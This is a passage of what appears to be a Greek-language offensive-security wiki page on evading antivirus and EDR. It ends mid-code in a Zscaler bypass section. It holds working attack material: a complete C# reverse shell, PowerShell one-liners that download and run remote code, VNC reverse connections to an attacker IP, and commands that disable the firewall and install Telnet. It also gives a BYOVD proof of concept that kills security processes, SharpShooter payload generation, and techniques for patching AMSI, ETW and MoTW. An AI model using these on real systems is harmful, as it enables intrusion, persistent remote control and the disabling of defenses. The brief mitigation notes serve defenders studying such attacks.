Η καταγραφή PowerShell είναι μια λειτουργία που σου επιτρέπει να καταγράφεις όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να είναι ένα **πρόβλημα για attackers που θέλουν να αποφύγουν την ανίχνευση**.

Για να παρακάμψεις το PowerShell logging, μπορείς να χρησιμοποιήσεις τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείς να χρησιμοποιήσεις ένα tool όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιείς PowerShell version 2, το AMSI δεν θα φορτωθεί, οπότε μπορείς να εκτελέσεις τα scripts σου χωρίς να σαρωθούν από το AMSI. Μπορείς να το κάνεις έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποίησε το [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να ξεκινήσεις ένα powershell χωρις defenses (αυτό χρησιμοποιεί το `powerpick` από το Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Όταν αναλύεις malware που χρησιμοποιεί ConfuserEx 2 (ή commercial forks) είναι συνηθισμένο να αντιμετωπίζεις πολλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes.  Το παρακάτω workflow αποκαθιστά αξιόπιστα ένα σχεδόν-αρχικό IL, το οποίο στη συνέχεια μπορεί να αποσυμβολοποιηθεί σε C# με tools όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`).  Αυτό επίσης διορθώνει το PE checksum, οπότε οποιαδήποτε τροποποίηση θα προκαλέσει crash στο binary.  Χρησιμοποίησε το **AntiTamperKiller** για να εντοπίσεις τους κρυπτογραφημένους metadata tables, να ανακτήσεις τα XOR keys και να ξαναγράψεις ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Το output περιέχει τις 6 anti-tamper παραμέτρους (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν χτίζεις το δικό σου unpacker.

2.  Symbol / control-flow recovery – δώσε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επέλεξε το ConfuserEx 2 profile
• το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και variable names και θα αποκρυπτογραφήσει constant strings.

3.  Proxy-call stripping – το ConfuserEx αντικαθιστά τα direct method calls με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περισσότερο το decompilation.  Αφαίρεσέ τα με το **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να βλέπεις κανονικό .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για ασαφείς wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξε το τελικό binary μέσα στο dnSpy, κάνε αναζήτηση για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσεις το *real* payload.  Συχνά το malware το αποθηκεύει ως ένα TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά το execution flow **χωρίς** να χρειάζεται να τρέξεις το malicious sample – χρήσιμο όταν δουλεύεις σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για να γίνει αυτόματα triage στα samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/) που να μπορεί να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator demonstates πώς να χρησιμοποιείς τη γλώσσα `C++11/14` για να παράγεις, κατά το compile time, obfuscated code χωρίς να χρησιμοποιείς κανένα external tool και χωρίς να τροποποιείς τον compiler.
- [**obfy**](https://github.com/fritzone/obfy): Πρόσθεσε ένα layer από obfuscated operations που δημιουργείται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crackάρει την application λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένα x64 binary obfuscator που μπορεί να obfuscate διάφορα διαφορετικά pe files, συμπεριλαμβανομένων: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages χρησιμοποιώντας ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code μετασχηματίζοντας κανονικές instructions σε ROP chains, thwarting τη φυσική μας αντίληψη για το κανονικό control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Μπορεί να έχεις δει αυτήν την οθόνη όταν κατεβάζεις κάποια executables από το internet και τα εκτελείς.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που προορίζεται να προστατεύει τον τελικό χρήστη από την εκτέλεση potentially malicious εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη reputation, πράγμα που σημαίνει ότι εφαρμογές που κατεβαίνουν ασυνήθιστα θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και αποτρέποντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ σε More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα όταν κατεβάζονται αρχεία από το internet, μαζί με το URL από το οποίο κατέβηκαν.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables υπογεγραμμένα με ένα **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψεις τα payloads σου από το να αποκτήσουν το Mark of The Web είναι να τα συσκευάζεις μέσα σε κάποιο είδος container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που δεν είναι **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ είναι ένα demo για bypassing SmartScreen με packaging payloads μέσα σε ISO files χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στο Windows που επιτρέπει σε εφαρμογές και system components να **log events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για να παρακολουθούν και να ανιχνεύουν malicious activities.

Παρόμοια με το πώς το AMSI είναι disabled (bypassed), είναι επίσης δυνατό να κάνεις τη συνάρτηση **`EtwEventWrite`** του user space process να επιστρέφει αμέσως χωρίς να καταγράφει κανένα event. Αυτό γίνεται με patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά το ETW logging για εκείνο το process.

Μπορείς να βρεις περισσότερες πληροφορίες στο **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Το loading C# binaries in memory είναι γνωστό εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για να τρέχεις τα post-exploitation tools σου χωρίς να σε πιάσει το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το disk, θα χρειαστεί να ανησυχούμε μόνο για patching του AMSI για όλο το process.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ήδη παρέχουν τη δυνατότητα να εκτελείς C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει το **spawning ενός νέου sacrificial process**, inject τον post-exploitation malicious code σου σε εκείνο το νέο process, execute τον malicious code σου και όταν τελειώσει, kill το νέο process. Αυτό έχει και τα πλεονεκτήματα και τα μειονεκτήματά του. Το πλεονέκτημα της fork and run μεθόδου είναι ότι η εκτέλεση γίνεται **εκτός** του Beacon implant process μας. Αυτό σημαίνει ότι αν κάτι πάει στραβά στην post-exploitation ενέργειά μας ή αν γίνει caught, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant μας να επιβιώσει.** Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να γίνει caught από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για injecting του post-exploitation malicious code **μέσα στο δικό του process**. Με αυτόν τον τρόπο, μπορείς να αποφύγεις τη δημιουργία νέου process και το scanning του από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σου, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσεις το beacon σου** επειδή μπορεί να κρασάρει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλεις να διαβάσεις περισσότερα για C# Assembly loading, δες αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείς επίσης να φορτώσεις C# Assemblies **από PowerShell**, δες το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσεις malicious code χρησιμοποιώντας άλλες γλώσσες δίνοντας στο compromised machine πρόσβαση **στο interpreter environment που είναι εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο environment στο SMB share μπορείς να **εκτελέσεις arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.

Το repo αναφέρει: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Το Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **manipulate το access token ή ένα security proucct όπως EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges του ώστε το process να μην πεθάνει αλλά να μην έχει permissions για να ελέγχει malicious activities.

Για να το αποτρέψει αυτό το Windows θα μπορούσε να **prevent external processes** από το να παίρνουν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να κάνεις deploy το Chrome Remote Desktop σε έναν victim's PC και μετά να το χρησιμοποιήσεις για takeover και persistence:
1. Κατέβασε από https://remotedesktop.google.com/, κάνε κλικ στο "Set up via SSH", και μετά κάνε κλικ στο MSI file για Windows για να κατεβάσεις το MSI file.
2. Τρέξε αθόρυβα το installer στο victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Γύρνα στη σελίδα του Chrome Remote Desktop και κάνε κλικ next. Το wizard θα σου ζητήσει μετά authorization; κάνε κλικ στο κουμπί Authorize για να συνεχίσεις.
4. Εκτέλεσε το δοσμένο parameter με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημείωση το pin param που επιτρέπει να ορίσεις το pin χωρίς να χρησιμοποιείς το GUI).


## Advanced Evasion

Το Evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβεις υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο system, οπότε είναι πρακτικά αδύνατο να παραμείνεις εντελώς undetected σε mature environments.

Κάθε environment που αντιμετωπίζεις θα έχει τα δικά του strengths και weaknesses.

Σου προτείνω πολύ να δεις αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσεις ένα foothold σε πιο Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια ακόμη εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) για Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείς να χρησιμοποιήσεις το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **remove parts of the binary** μέχρι να **finds out which part Defender** βρίσκει ως malicious και να σου το χωρίσει.\
Ένα άλλο tool που κάνει το **same thing is** το [**avred**](https://github.com/dobin/avred) με ένα open web offering the service στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι το Windows10, όλα τα Windows έρχονταν με έναν **Telnet server** που μπορούσες να εγκαταστήσεις (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Να ξεκινάει όταν το σύστημα ξεκινά και να το τρέξεις τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή telnet port** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε password στο _VNC Password_
- Ορίστε password στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα** στον **host** του το binary `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμο** να δεχτεί ένα reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Ξεκινήστε το daemon του winvnc `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσετε stealth δεν πρέπει να κάνετε μερικά πράγματα

- Μην ξεκινήσετε το `winvnc` αν ήδη τρέχει, γιατί θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, γιατί θα προκαλέσει να ανοίξει το [config window](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια, γιατί θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκίνα τον lister** με `msfconsole -r file.rc` και **εκτέλεσε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει το process πολύ γρήγορα.**

### Compiling our own reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Compile it with:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποίησέ το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της python για παραδείγματα build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Το Storm-2603 αξιοποίησε ένα μικρό βοηθητικό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις endpoint protections πριν ρίξει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελέσει privileged kernel operations που ούτε οι Protected-Process-Light (PPL) AV services δεν μπορούν να μπλοκάρουν.

Βασικά σημεία
1. **Signed driver**: Το αρχείο που παραδίδεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα signed driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη Microsoft signature φορτώνεται ακόμα και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει μια αυθαίρετη διεργασία με βάση PID (χρησιμοποιείται για να σκοτώσει Defender/EDR services) |
| `0x990000D0` | Διαγράφει ένα αυθαίρετο αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί το service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD παρακάμπτει πλήρως τις user-mode protections· code που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τα τερματίσει ή να αλλοιώσει kernel objects ανεξάρτητα από PPL/PP, ELAM ή άλλα hardening features.

Detection / Mitigation
•  Ενεργοποιήστε το vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`) ώστε το Windows να αρνείται να φορτώσει το `AToolsKrnl64.sys`.
•  Παρακολουθείτε δημιουργίες νέων *kernel* services και ειδοποιήστε όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στο allow-list.
•  Ελέγχετε για user-mode handles σε custom device objects που ακολουθούνται από suspicious `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει device-posture rules τοπικά και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές κάνουν δυνατό ένα πλήρες bypass:

1. Η αξιολόγηση posture γίνεται **εξ ολοκλήρου client-side** (ένας boolean στέλνεται στον server).
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το connecting executable είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).

Με **patching τεσσάρων signed binaries στο δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1` ώστε κάθε έλεγχος να θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιοδήποτε (ακόμα και unsigned) process μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
